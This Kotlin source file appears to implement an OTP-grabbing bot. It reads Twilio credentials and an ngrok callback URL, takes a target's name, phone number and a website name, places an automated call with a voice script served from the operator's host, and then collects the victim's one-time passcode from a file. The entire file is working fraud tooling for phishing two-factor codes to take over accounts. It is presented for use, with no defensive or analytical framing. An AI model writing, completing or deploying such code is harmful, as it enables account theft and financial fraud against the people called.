import android.os.AsyncTask
import com.twilio.Twilio
import com.twilio.rest.api.v2010.account.Call
import com.twilio.type.PhoneNumber
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.net.URI

class OTPScript(
    private val configFilePath: String,
    private val onStatusUpdate: (String) -> Unit,
    private val onOtpReceived: (String) -> Unit
) {
    private lateinit var accountSid: String
    private lateinit var authToken: String
    private lateinit var twilioNumber: String
    private lateinit var ngrokUrl: String

    fun run() {
        // Read config from file
        try {
            val configFile = File(configFilePath)
            if (!configFile.exists()) {
                onStatusUpdate("Config file not found.")
                return
            }
            val config = configFile.readText().split("\n")
            accountSid = config[0]
            authToken = config[1]
            twilioNumber = config[2]
            ngrokUrl = config[3]
        } catch (e: IOException) {
            onStatusUpdate("Error reading config file.")
            return
        }

        Twilio.init(accountSid, authToken)

        // Get target information
        val name = readOrWriteFile("name.txt", "Please enter target's name: ")
        val site = readOrWriteFile("site.txt", "Please enter name of website: ")
        val to = readOrWriteFile("to.txt", "Please enter target's phone number: ")

        // Make call
        val call = Call.creator(
            PhoneNumber(to),
            PhoneNumber(twilioNumber),
            URI.create("$ngrokUrl/voice")
        ).setStatusCallback("$ngrokUrl/voice")
            .setStatusCallbackEvent(
                listOf(
                    "queued", "initiated", "answered", "ringing",
                    "canceled", "completed", "busy", "no-answer", "failed"
                )
            )
            .setStatusCallbackMethod("POST")
            .create()

        onStatusUpdate("Call initiated.")
        checkCallStatus(call.sid)
    }

    private fun readOrWriteFile(fileName: String, prompt: String): String {
        val file = File(fileName)
        if (!file.exists()) {
            val value = readLine() ?: ""
            FileOutputStream(fileName).use { it.write(value.toByteArray()) }
            return value
        }
        return file.readText()
    }

    private fun checkCallStatus(sid: String) {
        AsyncTask.execute {
            var prevStatus = ""
            while (true) {
                val call = Call.fetcher(sid).fetch()
                val status = call.status.toString()
                if (status != prevStatus) {
                    onStatusUpdate(status)
                    prevStatus = status
                }
                if (status == "completed" || status == "failed" || status == "no-answer" || status == "canceled") {
                    break
                }
                Thread.sleep(1000)
            }

            val otp = File("otp.txt").readText()
            if (otp.isBlank()) {
                onOtpReceived("No OTP received.")
            } else {
                onOtpReceived("OTP: $otp")
            }
        }
    }
}
